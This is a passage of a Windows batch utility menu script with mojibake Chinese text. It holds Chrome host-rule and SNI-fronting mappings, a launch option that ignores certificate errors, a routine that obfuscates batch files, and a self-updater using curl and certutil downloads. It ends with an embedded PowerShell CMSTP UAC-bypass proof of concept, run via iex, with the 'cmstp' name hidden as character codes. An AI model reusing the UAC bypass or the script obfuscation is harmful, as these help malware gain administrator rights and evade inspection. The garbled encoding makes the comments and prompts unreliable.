		"mail.proton.me=c.pr.tn"

		"#youtube"
		"@.youtube.com=click.google-analytics.com"
		"@.ytimg.com=pagead1.googleadservices.com"
		"@.ggpht.com=static.doubleclick.net"
		"youtube.com=static.doubleclick.net"
		"youtu.be=mt7.gstatic.com"
		"@.youtube-nocookie.com=click.google-analytics.com"
		"youtube-nocookie.com=click.google-analytics.com"

		"#google"
		"google.com=pagead1.googleadservices.com"
		"@.google.com=pagead1.googleadservices.com"
		"@.google.com.hk=www.googletagmanager.com"
		"@.google.com.tw=www.googletagmanager.com"
		"@.googleapis.com=static.doubleclick.net"
		"@.googleusercontent.com=static.doubleclick.net"
		"@.gstatic.com=pagead2.googlesyndication.com"
		"@.cloudfunctions.net=alt6.gstatic.com"
		"@.blogspot.com=click.google-analytics.com"
		"@.googlesource.com=pagead1.googleadservices.com"
		"@.chromium.org=google-analytics.com"
		"@.google=pagead1.googleadservices.com"
		"android.com=alt6.gstatic.com"
		"@.android.com=alt6.gstatic.com"
		"chrome.com=mt7.gstatic.com"
		"@.chrome.com=mt7.gstatic.com"

		"#github"
		"github.com=octocaptcha.com"
		"@.github.com=octocaptcha.com"
		"raw.githubusercontent.com=avatars.githubusercontent.com"
		"@.github.io=octocaptcha.com"
		"github.io=octocaptcha.com"

		"#steam"
		"login.steampowered.com=login.steampowered.com"
		"help.steampowered.com=help.steampowered.com"
		"@.steampowered.com=steamuserimages-a.akamaihd.net"
		"steamcommunity.com=underlords.com"
		"@.steamcommunity.com=underlords.com"

		"#onedrive"
		"onedrive.live.com=od0.live.com"
		"skyapi.onedrive.live.com=storage.live.com"

		"#nyaa"
		"nyaa.si=nyaa.ddos-guard.net"

		"#vercel.app"
		"vercel.app=no-sni.vercel-infra.com"
		"@.vercel.app=no-sni.vercel-infra.com"

		"#lain.la"
		"pkuanvil.com=gcore.com"
		"@.pkuanvil.com=gcore.com"

		"#quora"
		"quora.com=qr.ae"
		"@.quora.com=qr.ae"

		"#duckduckgo"
		"duckduckgo.com=duck.co"
		"@.duckduckgo.com=duck.co"

		"[�����ؽ���]"

		"#wikipedia"
		"#wikidata.org=[2620:0:863:ed1a::1]"
		"#wikidata.org=208.80.153.224"

		"#protonmail"
		"pr.tn=proton.me"
		"a.pr.tn=account.proton.me"
		"b.pr.tn=account-api.proton.me"
		"c.pr.tn=mail.proton.me"

		"#youtube google"
		"#mt7.gstatic.com=[2404:6800:4008:c19::5a]"
		"mt7.gstatic.com=216.239.36.53"
		"#alt6.gstatic.com=[2404:6800:4008:c19::5a]"
		"alt6.gstatic.com=216.239.36.53"
		"#click.google-analytics.com=[2404:6800:4008:c19::5a]"
		"click.google-analytics.com=216.239.36.53"
		"#pagead1.googleadservices.com=[2404:6800:4008:c19::5a]"
		"pagead1.googleadservices.com=216.239.36.53"
		"#pagead2.googlesyndication.com=[2404:6800:4008:c19::5a]"
		"pagead2.googlesyndication.com=216.239.36.53"
		"#static.doubleclick.net=[2404:6800:4008:c19::5a]"
		"static.doubleclick.net=216.239.36.53"
		"#www.googletagmanager.com=[2404:6800:4008:c19::5a]"
		"www.googletagmanager.com=216.239.36.53"

		"#nyaa"
		"nyaa.ddos-guard.net=nyaa.si"

		"[ǿ��ʹ��quic]"

		"#��֧��ͨ���"
		"alt6.gstatic.com"
		"click.google-analytics.com"
		"pagead2.googlesyndication.com"
		"pagead1.googleadservices.com"
		"static.doubleclick.net"
		"www.googletagmanager.com"
		"www.google.com.hk"
		"www.google.com.tw"
		"www.google.com"
		"www.quora.com"
		"quora.com"
		"qsbr.cf2.quoracdn.net"
		"v2ex.com"
		"cdn.v2ex.com"
		"www.v2ex.com"
		"challenges.cloudflare.com"
		"www.openstreetmap.org"
		"tile.openstreetmap.org"
		"a.tile.openstreetmap.org"
		"b.tile.openstreetmap.org"
		"c.tile.openstreetmap.org"
		"ipfs.io"
		"cloudflare-ipfs.com"
		"croxyproxy.com"
		"cdnjs.cloudflare.com"
		"cdn.jsdelivr.net"
		"chatgpt.aitianhu.com"
		"outlook.live.com"
	) do (
		echo;%%~a
	)
	)
)
cd /d "%~dp0"
rem ����֤����� (0=���� 1=����)
set "pass_cert_error=0"
rem �������������Ƿ���� (0=���� 1=����)
set "brpro=0"
rem ����chrome-command-line�ļ� (0=���� 1=����)
set "chrome-command-line=0"
rem �����û�����·�� (ֵΪ�ջ���Чʱʹ��Ĭ��·��)
set user-data-dir=
rem ����֧��chrome�����е��������·��
set "chromium=!ProgramFiles(x86)!\Microsoft\Edge\Application\msedge.exe"
rem �����ļ�·��
set "dfurl=!temp!\sni.ini"
call :ljjc user-data-dir dir
if errorlevel 1 (
	set "user-data-dir=--user-data-dir="!user-data-dir!""
) else (
	set user-data-dir=
)
if "!pass_cert_error!" equ "1" (
	set "ignore-certificate-errors=--ignore-certificate-errors"
)
if exist "chrome.exe" (
	set chrome=chrome.exe
	goto startchrome
) else (
	for /f "skip=2 tokens=3" %%a in ('"2>nul reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" /v Path"') do (
		set "chrome=%%a"
	)
	for /f "delims=" %%a in ("!chrome!") do (set "chrome=%%~fa")
	if exist "!chrome!\Chrome.exe" (
		set "chrome=!chrome!\Chrome.exe"
		goto startchrome
	) else (
		for /f "delims=" %%a in ("!chromium!") do (set "chrome=%%~fa")
		if exist "!chrome!" (
			goto startchrome
		) else (
			<nul set /p "=û���ҵ������·��"
			call :out 2
			endlocal
			goto memuv2
		)
	)
)
:startchrome
if "!brpro!" equ "1" (
	for /f "delims=" %%a in ("!chrome!") do (
		for /f "tokens=1 delims=," %%b in ('tasklist /fi "imagename eq %%~nxa" /fo csv /nh') do (
			if /i "%%~b" equ "%%~nxa" (
				<nul set /p "=%%~nxa��������,��ر������������."
				call :out 2
				endlocal
				goto memuv2
			)
		)
	)
)
call :ini "!dfurl!" host_rules �����ض���
call :ini "!dfurl!" host_resolver_rules �����ؽ���
call :ini "!dfurl!" origin_to_force_quic_on ǿ��ʹ��quic
for /l %%a in (1,1,!host_rules!) do (
	for /f "tokens=1,2 delims== " %%a in ("!host_rules%%a!") do (
		set "host-rules=!host-rules!MAP %%a %%b, "
	)
)
if defined host-rules (
	set "host-rules=--host-rules="!host-rules:~0,-2!""
	set "host-rules=!host-rules:@=*!"
)
for /l %%a in (1,1,!host_resolver_rules!) do (
	for /f "tokens=1,2 delims== " %%a in ("!host_resolver_rules%%a!") do (
		set "host-resolver-rules=!host-resolver-rules!MAP %%a %%b, "
	)
)
if defined host-resolver-rules (
	set "host-resolver-rules=--host-resolver-rules="!host-resolver-rules:~0,-2!""
)
for /l %%a in (1,1,!origin_to_force_quic_on!) do (
	for /f "tokens=1,2 delims=:" %%a in ("!origin_to_force_quic_on%%a!") do (
		if "%%b" equ "" (
			set "origin-to-force-quic-on=!origin-to-force-quic-on!%%a:443, "
		) else (
			set "origin-to-force-quic-on=!origin-to-force-quic-on!%%a:%%b, "
		)
	)
)
if defined origin-to-force-quic-on (
	set "origin-to-force-quic-on=--enable-quic --origin-to-force-quic-on="!origin-to-force-quic-on:~0,-2!""
)
if "!chrome-command-line!" equ "1" (
	>chrome-command-line <nul set /p "=chrome --test-type !host-rules! !host-resolver-rules! !origin-to-force-quic-on! !ignore-certificate-errors!"
)
start /max "" "!chrome!" --profile-directory=Default !user-data-dir! --test-type !host-rules! !host-resolver-rules! !origin-to-force-quic-on! !ignore-certificate-errors!
endlocal
goto memuv2
:73
setlocal
title ��һ�����ļ���ѹ��!system!
cls
set source_dir=
set target_dir=
set /p "source_dir=����ԴĿ¼: "
call :ljjc source_dir dir&&goto 73.3
set /p "target_dir=����Ŀ��Ŀ¼: "
call :ljjc target_dir dir&&goto 73.3
pushd "!source_dir!"
echo;ȡ���ļ���������...
for /f "delims=" %%a in ('dir /ah /s /b') do (attrib -h "%%a")
for /r %%f in (*) do (
	cls
	set "relative_path=%%~pf"
	set "relative_path=!relative_path:%source_dir%=!"
	set "target_path=!target_dir!!relative_path!"
	if not exist "!target_path!" (md "!target_path!")
	echo;"%%f" �� "!target_path!%%~nxf"
	copy /y /z "%%f" "!target_path!%%~nxf"
	call :73.2 "!target_path!%%~nxf" %%~zf %%~xf
)
popd
%hx%
%pause%
endlocal
goto memuv2
:73.2
if %2 gtr 4096 (
	for %%a in (
		.7z .ogg .mpg .gif .zip .rar .png .jpg .wmf .wmv .bik .bk2 .mp3
		.acc .m4a .ape .mp4 .avi .flv .f4v .mkv .3gp .cab .pdf .jpeg .flac
	) do (
		if /i "%3" equ "%%a" (goto :eof)
	)
	compact /c /exe:lzx "%~1"
)
goto :eof
:73.3
<nul set /p "=��Ч����"
call :out 2
endlocal
goto 73
:74
setlocal
cls
title ��֤�����Ԫ!system!
%hx%
for %%a in (
	"[1]certmgr	[֤�� - ��ǰ�û�]"
	"[2]certlm	[֤�� - ���ؼ����]"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=120
%sel% shuru
if "!shuru!" equ "1" (start certmgr.msc&goto memuv2)
if "!shuru!" equ "2" (start certlm.msc&goto memuv2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
endlocal
goto 74
:75
setlocal
color 0a
title bat����!system!
cls
echo;�˹���ֻ�������ڴ��ı��ļ�����
%hx%
for %%a in (
	"[1]bat�ļ�����(����1)"
	"[2]bat�ļ�����"
	"[3]bat�ļ�����(����2)(�Ƽ�ʹ��)"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=1230
%sel% shuru
if "!shuru!" equ "1" (goto 75.1)
if "!shuru!" equ "2" (goto 75.2)
if "!shuru!" equ "3" (goto 75.3)
if "!shuru!" equ "4" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 75
:75.1
title bat�ļ�����(����1)!system!
cls
set jiami=
set /p "jiami=�϶���Ҫ���ܵ��ļ����˴���(e=����): "
call :var jiami
if /i "!jiami!" equ "e" (
	endlocal
	goto 75
)
call :ljjc jiami&&(
	<nul set /p "=��Ч·��"
	call :out 2
	goto 75.1
)
cls
for /f "delims=" %%b in ("!jiami!") do (
	set /a "batpdjg=%%~zb%%2"
	if "!batpdjg!" equ "1" (set "batpdjg= ") else (set "batpdjg=")
	set aaa=
	for /l %%b in (0,1,128) do (set "aaa=!aaa!%%%%a ")
	set "aaa=!aaa:~0,-1!!batpdjg!"
	>"%temp%\1.tmp" (
	echo;!aaa!
	echo;cls
	)
	>nul copy /b /y "%temp%\1.tmp"+"%%b" "%%~dpb����_%%~nb%%~xb"
	del /f /q "%temp%\1.tmp"
)
cls
<nul set /p "=�������"
call :out 2
endlocal
goto 75
:75.2
title bat�ļ�����!system!
cls
set jiemi=
set /p "jiemi=�϶���Ҫ���ܵ��ļ����˴���(e=����): "
call :var jiemi
if /i "!jiemi!" equ "e" (
	endlocal
	goto 75
)
call :ljjc jiemi&&(
	<nul set /p "=��Ч·��"
	call :out 2
	goto 75.2
)
cls
for /f "delims=" %%a in ("!jiemi!") do (
	>"%temp%\1.tmp" echo;
	>nul copy /b /y "%temp%\1.tmp"+"%%a" "%%~dpa����_%%~na%%~xa"
	del /f /q "%temp%\1.tmp"
)
cls
<nul set /p "=�������"
call :out 2
endlocal
goto 75
:75.3
cls
title bat�ļ�����(����2)!system!
set jiami=
set /p "jiami=�϶���Ҫ���ܵ��ļ����˴���(e=����): "
call :var jiami
if /i "!jiami!" equ "e" (
	endlocal
	goto 75
)
call :ljjc jiami&&(
	<nul set /p "=��Ч·��"
	call :out 2
	goto 75.3
)
cls
for /f "delims=" %%a in ("!jiami!") do (
	>"%temp%\1.tmp" <nul set /p "=//4NCg=="
	>nul certutil -decode -f "%temp%\1.tmp" "%temp%\2.tmp"
	>nul copy /b /y "%temp%\2.tmp"+"%%a" "%%~dpa����_%%~na%%~xa"
	del /f /q "%temp%\1.tmp";"%temp%\2.tmp"
)
cls
<nul set /p "=�������"
call :out 2
endlocal
goto 75
:76
setlocal
title vbs������!system!
set vbsbds=
set vbsjieguo=
cls
set /p "vbsbds=������ʽ(e=���ز˵�): "
if not defined vbsbds (endlocal&goto 76)
if /i "!vbsbds!" equ "e" (endlocal&goto memuv2)
>"%temp%\temp.vbs" echo;msgbox !vbsbds!,"65","VBS������"
"%temp%\temp.vbs"
del /f /q "%temp%\temp.vbs"
endlocal
goto 76
:77
setlocal
title ִ��w32tm /resync��ʱ!system!
cls
set timesvr=
for /f "tokens=3 delims=: " %%a in ('sc query w32time') do (
	if /i "%%a" equ "running" (set timesvr=1)
)
if defined timesvr (
	echo;w32time������������
) else (
	echo;w32time����δ���У���������...
	sc start w32time
	if errorlevel 1 (
		echo;�޷�����w32time����
	) else (
		echo;w32time�����ѳɹ�����
		set stop=1
	)
)
set attempts=
for /f "tokens=1,2 delims=:," %%a in ('w32tm /query /configuration') do (
	>nul 2>nul set "%%a=%%b"
)
echo;��ǰʱ�������: !ntpserver:~1!
:77.1
for /f "delims=" %%a in ('w32tm /resync') do (
	set "tbjg=%%a"
	echo;%%a
)
if "!tbjg:~0,2!" neq "�ɹ�" (
	set /a "attempts+=1"
	if !attempts! lss 3 (
		echo;����ͬ��ʱ��ʧ��[!attempts!/3]
		echo;
		goto 77.1
	) else (
		echo;����ͬ��ʱ��ʧ��[!attempts!/3]
		echo;�Ѵﵽ������Դ���
	)
)
if "!stop!" equ "1" (>nul 2>nul sc stop w32time 4:5:2 "DOS������ - ִ��w32tm /resync��ʱ - ��ԭw32time����״̬")
%hx%
%pause%
endlocal
goto memuv2
:78
setlocal
title �������MAC��ַ!system!
cls
set mac=1
set /p "mac=������Ҫ���ɵ�MAC��ַ����(Ĭ������1��)(e=���ز˵�): "
if /i "!mac!" equ "e" (endlocal&goto memuv2)
call :checkvar mac num&&(
	<nul set /p "=��Ч����"
	call :out 2
	endlocal
	goto 78
)
for /l %%a in (1,1,!mac!) do (call :ranmac)
%hx%
%pause%
endlocal
goto memuv2
:hash
if exist "!windir!\system32\certutil.exe" (
	for /f "skip=1 eol=C" %%a in ('certutil -hashfile "%~1" %2') do (
		if "%3" neq "" (
			set "%3=%%a"
			goto :eof
		) else (
			echo;%%a
			goto :eof
		)
	)
)
goto :eof
:update
setlocal
cls
title ����DOS������ - ��ǰ�汾: !ver!!system!
set "doh=--doh-url https://101.101.101.101/dns-query"
set "ua=-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36""
set resolve=--resolve raw.github.io:443:^
185.199.110.133,^
185.199.109.133,^
185.199.111.133,^
185.199.108.133,^
2606:50c0:8001::154,^
2606:50c0:8003::154,^
2606:50c0:8000::154,^
2606:50c0:8002::154
set "jshost=-H "host: cdn.jsdelivr.net""
set "githost=-H "host: raw.githubusercontent.com""
set "gxurlhost1=https://raw.github.io/Trustedinstall/dostool/main/update.js"
set "gxurlhost2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js"
set "gxurl1=https://raw.githubusercontent.com/Trustedinstall/dostool/main/update.js"
set "gxurl2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js"
set "gxdoshost1=https://raw.github.io/Trustedinstall/dostool/main/dostool.js"
set "gxdoshost2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js"
set "gxdos1=https://raw.githubusercontent.com/Trustedinstall/dostool/main/dostool.js"
set "gxdos2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js"
echo;������°汾...
if exist "%temp%\dostoolupdate" (del /f /q "%temp%\dostoolupdate")
if exist "!windir!\system32\curl.exe" (
	pushd "%temp%"
	call :curlproxy
	echo;ʹ������:	!gxurlhost1!
	echo;Host����:	!githost:~10,-1!
	curl !proxy! !doh! !githost! !ua! --compressed --remove-on-error -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 3 --max-time 10 !resolve! -o dostoolupdate "!gxurlhost1!"
	if exist "%temp%\dostoolupdate" (
		for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
			set "gxver=%%a"
			set "doshash=%%b"
			set "dossize=%%c"
			set "host=!githost!"
			set "url=!gxdoshost1!"
		)
		popd
		goto updatecheck
	) else (
		echo;ʹ������:	!gxurl1!
		curl !proxy! !doh! !ua! --compressed --remove-on-error -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 3 --max-time 10 -o dostoolupdate "!gxurl1!"
		if exist "%temp%\dostoolupdate" (
			for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
				set "gxver=%%a"
				set "doshash=%%b"
				set "dossize=%%c"
				set host=
				set resolve=
				set "url=!gxdos1!"
			)
			popd
			goto updatecheck
		) else (
			echo;ʹ������:	!gxurlhost2!
			echo;Host����:	!jshost:~10,-1!
			curl !proxy! !doh! !jshost! !ua! --compressed --remove-on-error -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 3 --max-time 10 !resolve! -o dostoolupdate "!gxurlhost2!"
			if exist "%temp%\dostoolupdate" (
				for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
					set "gxver=%%a"
					set "doshash=%%b"
					set "dossize=%%c"
					set "host=!jshost!"
					set "url=!gxdoshost2!"
				)
				popd
				goto updatecheck
			) else (
				echo;ʹ������:	!gxurl2!
				curl !proxy! !doh! !ua! --compressed --remove-on-error -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 3 --max-time 10 -o dostoolupdate "!gxurl2!"
				if exist "%temp%\dostoolupdate" (
					for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
						set "gxver=%%a"
						set "doshash=%%b"
						set "dossize=%%c"
						set host=
						set resolve=
						set "url=!gxdos2!"
					)
					popd
					goto updatecheck
				) else (
					echo;û�м�鵽���°汾
					%hx%
					%pause%
					endlocal
					set verbak=
					goto memuv2
				)
			)
		)
	)
) else (
	echo;ʹ������:	!gxurl1!
	certutil -urlcache -split -f !gxurl1! "%temp%\dostoolupdate"
	if exist "%temp%\dostoolupdate" (
		for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
			set "gxver=%%a"
			set "doshash=%%b"
			set "dossize=%%c"
			set "url=!gxdos1!"
		)
		goto updatecheck
	) else (
		echo;ʹ������:	!gxurl2!
		certutil -urlcache -split -f !gxurl2! "%temp%\dostoolupdate"
		if exist "%temp%\dostoolupdate" (
			for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
				set "gxver=%%a"
				set "doshash=%%b"
				set "dossize=%%c"
				set "url=!gxdos2!"
			)
			goto updatecheck
		) else (
			echo;û�м�鵽���°汾
			%hx%
			%pause%
			endlocal
			set verbak=
			goto memuv2
		)
	)
)
:updatecheck
cls
if exist "%temp%\dostoolupdate" (del /f /q "%temp%\dostoolupdate")
set /a "checkver=gxver-verbak"
if !checkver! gtr 0 (
	<nul set /p "=��鵽���°汾: "
	call :colortxt a !gxver!
	call :xdwjs %~z0 b old
	call :xdwjs !dossize! b new
	call :hash %0 sha1 oldhash
	echo;
	echo;�ļ���С: !old! [%~z0 �ֽ�] �� !new! [!dossize! �ֽ�]
	echo;SHA1: !oldhash! �� !doshash!
	%hx%
	set shuru=
	set /p "shuru=���س������£���e���ز˵�:"
	call :var shuru
	if not defined shuru (goto startupdate)
	if /i "!shuru!" equ "e" (
		endlocal
		set verbak=
		goto memuv2
	)
	<nul set /p "=������Ч"
	call :out 2
	goto updatecheck
) else (
	echo;û�м�鵽���°汾
	%hx%
	%pause%
	endlocal
	set verbak=
	goto memuv2
)
:startupdate
cls
echo;�������ظ���...
if exist "%temp%\dostool" (del /f /q "%temp%\dostool")
if exist "!windir!\system32\curl.exe" (
	pushd "%temp%"
	echo;ʹ������:	!url!
	if defined host (echo;Host����:	!host:~10,-1!)
	curl !proxy! !doh! !host! !ua! --compressed -R --remove-on-error -L -# -C - --retry 2 --retry-delay 1 --connect-timeout 5 --max-time 30 !resolve! -o dostool "!url!"
	popd
) else (
	certutil -urlcache -split -f !url! "%temp%\dostool"
)
call :hash "%temp%\dostool" sha1 hash
if /i "!hash!" equ "!doshash!" (
	endlocal
	endlocal
	copy /z /y "%temp%\dostool" %0&del /f /q "%temp%\dostool"&goto chushihua
) else (
	call :colortxt c �ļ���Ч
	echo;
	call :out 2
	endlocal
	set verbak=
	goto memuv2
)
:sjc
setlocal
for /f "tokens=1-8 delims=:. " %%a in ("%~1 %~2") do (
	set "start_hour=%%a"
	set "start_minute=%%b"
	set "start_second=%%c"
	set "start_millisecond=%%d"
	set "end_hour=%%e"
	set "end_minute=%%f"
	set "end_second=%%g"
	set "end_millisecond=%%h"
)
for %%a in (
	start_hour
	start_minute
	start_second
	start_millisecond
	end_hour
	end_minute
	end_second
	end_millisecond
) do (
	if "!%%a:~0,1!" equ "0" (set "%%a=!%%a:~-1!")
)
set /a "time_difference-=start_hour*3600000+start_minute*60000+start_second*1000+start_millisecond*10"
set /a "time_difference+=end_hour*3600000+end_minute*60000+end_second*1000+end_millisecond*10"
if !time_difference! lss 0 (set /a "time_difference+=86400000")
set /a "diff_hours1=time_difference/3600000"
set /a "diff_minutes1=(time_difference%%3600000)/60000"
set /a "diff_seconds1=(time_difference%%60000)/1000"
set /a "diff_milliseconds=(time_difference%%1000)/10"
if !diff_hours1! lss 10 (set "diff_hours=0!diff_hours1!")
if !diff_minutes1! lss 10 (set "diff_minutes=0!diff_minutes1!")
if !diff_seconds1! lss 10 (set "diff_seconds=0!diff_seconds1!")
if !diff_milliseconds! lss 10 (set "diff_milliseconds=0!diff_milliseconds!")
set "time_diff=!diff_hours!:!diff_minutes!:!diff_seconds!.!diff_milliseconds!"
if "%4" equ "format" (
	for /f "tokens=1-3 delims=:" %%a in ("!diff_hours1!:!diff_minutes1!:!diff_seconds1!.!diff_milliseconds!") do (
		if "%%a" equ "0" (
			if "%%b" equ "0" (
				set "time_diff=%%c��"
			) else (
				set "time_diff=%%b��%%c��"
			)
		) else (
			set "time_diff=%%aСʱ%%b��%%c��"
		)
	)
)
if "%3" equ "" (
	echo;!time_diff!
) else (
	if "%3" equ "raw" (
		endlocal&set "%3=%time_difference%"
	) else (
		endlocal&set "%3=%time_diff%"
	)
)
goto :eof
:strlen
setlocal
set "$=!%1!#"
set N=&for %%a in (4096 2048 1024 512 256 128 64 32 16)do if !$:~%%a!. NEQ . set/aN+=%%a&set $=!$:~%%a!
set $=!$!fedcba9876543210&set/aN+=0x!$:~16,1!
endlocal&If %2. neq . (set/a%2=%N%)else echo;%N%
goto :eof
:ys
set /a "__yss=1%time:~0,2%*360000+1%time:~3,2%*6000+1%time:~6,2%*100+1%time:~-2%"
:ys_loop
set /a "__yse=(1%time:~0,2%*360000+1%time:~3,2%*6000+1%time:~6,2%*100+1%time:~-2%)-__yss"
if !__yse! lss %1 (goto ys_loop)
set __yss=
set __yse=
goto :eof
:list
set start=1
for %%a in (
	"���U�����lpk.dll����"
	"���U�����jwgkvsq.vmx�����������߸ò���"
	"����ϵͳ����"
	"��ʾϵͳ��Ϣ"
	"������������������"
	"��ʾ�������ļ�(���˸��ಡ����)"
	"���ע�������"
	"������������ƽ��"
	"�л���������ʾ��"
	"�����̸�ʽת��ΪNTFS"
	"���̴����޸�"
	"��ʽ��"
	"DOS������"
	"���������ʾ��������"
	"�����������"
	"���KHATRA����"
	"��ע���"
	"�򿪿������"
	"��DirectX��Ϲ���"
	"�򿪼��������"
	"�û�����"
	"�������"
	"DOS���������"
	"�ļ�ϵͳ��Ϣ��ѯ"
	"����ָ����С���ļ�"
	"����U�̲���"
	"������Ƭ����"
	"һ��ɾ�����ļ���"
	"ping���������ӳ�"
	"Ӳ�����"
	"������"
	"DOS����"
	"��ʱ��"
	"�������������"
	"ɾ��ÿ���̷��µ�System Volume Information�ļ���"
	"������ת����"
	"�ı����"
	"��ʾ��������û�������"
	"NTFSѹ��"
	"��ȡ�ļ�Ȩ��"
	"��ʾ����������"
	"�����Ķ���"
	"�������ļ����շ���"
	"�ļ�����"
	"�޸����𻵵��ļ�"
	"�����ƽ�ѹ��������"
	"Wifi�ȵ�"
	"������chm�ļ�"
	"�ر�����Ӧ����"
	"�ļ��Ƚ���"
	"������д����а�"
	"��ϵͳ��������"
	"��֪�����ռ�������"
	"��ѯϵͳ����״̬"
	"����ָ���ļ��Ŀ�ݷ�ʽ������"
	"��ϵͳ����"
	"����ͳ��"
	"�����������ӻ�Ŀ¼����"
	"�򿪹������̨"
	"���Streams�ļ�����"
	"������ɾ�����г���װ���"
	"ע�������"
	"Base64�����"
	"8.3���ļ�������"
	"����NTFSѹ��"
	"�����ļ���ϣֵ"
	"���������̷�"
	"��ѹmsi��װ�ļ�"
	"����CMD����̨ɫ�ʱ�"
	"KMS����Windows"
	"curl���������"
	"����ǰ�ò�������Chromium�������"
	"��һ�����ļ���ѹ��"
	"��֤�����Ԫ"
	"BAT�ı�����"
	"VBS������"
	"ִ��w32tm /resync��ʱ"
	"�������MAC��ַ"
) do (
	set /a "maxa+=1"
	set "a!maxa!=%%~a"
)
for %%a in (
	"js"
	"gx"
	"csh"
	"kcd"
	"gcd"
	"qzgx"
	"guanji"
	"guanyu"
	"offxsq"
) do (
	set "%%~a=%%~a"
)
goto :eof
:gx
set "verbak=!ver!"
goto update
:qzgx
set verbak=0
goto update
:csh
endlocal
goto chushihua
:offxsq
call :pwiex offdisplay
goto memuv2
:colortxt
setlocal
if "!winv!" equ "0" (goto colortxt2)
set "bj=%1"
if "!bj:~1,1!" equ "" (
	set "bj1=!color!"
	set "bj2=!bj!"
) else (
	set "bj1=!bj:~0,1!"
	set "bj2=!bj:~1,1!"
)
pushd "%temp%"
>"%~2" <nul set /p "=!cswz1!"
findstr /v /a:!bj1!!bj2! /r "^$" "%~2" nul
>nul 2>nul del /f /q "%~2"
popd
goto :eof
:colortxt2
set "bj=%1"
if 0x%bj:~0,1% gtr 0x9 (goto colortxt2.2)
if 0x%bj:~0,1% gtr 0x4 (goto colortxt2.1)
if "!bj:~0,1!" equ "0" (
	set bj1=40;
) else (
	if "!bj:~0,1!" equ "1" (
		set bj1=44;
	) else (
		if "!bj:~0,1!" equ "2" (
			set bj1=42;
		) else (
			if "!bj:~0,1!" equ "3" (
				set bj1=46;
			) else (
				if "!bj:~0,1!" equ "4" (
					set bj1=41;
				)
			)
		)
	)
)
goto colortxt2.3
:colortxt2.1
if "!bj:~0,1!" equ "5" (
	set bj1=45;
) else (
	if "!bj:~0,1!" equ "6" (
		set bj1=43;
	) else (
		if "!bj:~0,1!" equ "7" (
			set bj1=47;
		) else (
			if "!bj:~0,1!" equ "8" (
				set bj2=90m
			) else (
				if "!bj:~0,1!" equ "9" (
					set bj2=94m
				)
			)
		)
	)
)
goto colortxt2.3
:colortxt2.2
if /i "!bj:~0,1!" equ "a" (
	set bj2=92m
) else (
	if /i "!bj:~0,1!" equ "b" (
		set bj2=96m
	) else (
		if /i "!bj:~0,1!" equ "c" (
			set bj2=91m
		) else (
			if /i "!bj:~0,1!" equ "d" (
				set bj2=95m
			) else (
				if /i "!bj:~0,1!" equ "e" (
					set bj2=93m
				) else (
					if /i "!bj:~0,1!" equ "f" (
						set bj2=97m
					)
				)
			)
		)
	)
)
:colortxt2.3
if 0x%bj:~1,1% gtr 0xb (goto colortxt2.5)
if "!bj:~1,1!" equ "8" (
	set bj2=90m
) else (
	if "!bj:~1,1!" equ "9" (
		set bj2=94m
	) else (
		if /i "!bj:~1,1!" equ "a" (
			set bj2=92m
		) else (
			if /i "!bj:~1,1!" equ "b" (
				set bj2=96m
			)
		)
	)
)
goto colortxt2.6
:colortxt2.5
if /i "!bj:~1,1!" equ "" (
	set "bj1=!ysbak:~0,3!"
) else (
	if /i "!bj:~1,1!" equ "c" (
		set bj2=91m
	) else (
		if /i "!bj:~1,1!" equ "d" (
			set bj2=95m
		) else (
			if /i "!bj:~1,1!" equ "e" (
				set bj2=93m
			) else (
				if /i "!bj:~1,1!" equ "f" (
					set bj2=97m
				)
			)
		)
	)
)
:colortxt2.6
<nul set /p "=!cswz!!bj1!!bj2!%~2!cswz!!ysbak!"
goto :eof
:rgb
setlocal
set "brgb=%1"
set "qrgb=%2"
set "brgb=!brgb:.=;!"
set "qrgb=!qrgb:.=;!"
<nul set /p "=!cswz!48;2;!brgb!;38;2;!qrgb!m%~3!cswz!!ysbak!"
goto :eof
:su
>"%temp%\su.bat" <nul set /p "=!comspec! /c "%~dpnx0" ks"
powershell -mta -nologo -noprofile -command "$command=[IO.File]::ReadAllText('%~dpnx0') -split '#su\#.*'; iex ($command[1])"
rem �ӳ�ɾ���ļ�ȷ���ܱ���һ��ָ���ȡ
call :out 1
del /f /q "%temp%\su.bat";"%Temp%\CMSTP.inf"
exit 0
#su#
#UAC Bypass poc using SendKeys
Function Set-INFFile {
	[CmdletBinding()]
	Param (
		[Parameter(HelpMessage="Specify the INF file location")]
		$InfFileLocation = "$env:temp\CMSTP.inf",
		[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
		[String]$CommandToExecute = "$env:temp\su.bat"
	)
	$InfContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
;Commands Here will be run Before Setup Begins to install
$CommandToExecute
taskkill /IM $([char]99)$([char]109)$([char]115)$([char]116)$([char]112).exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
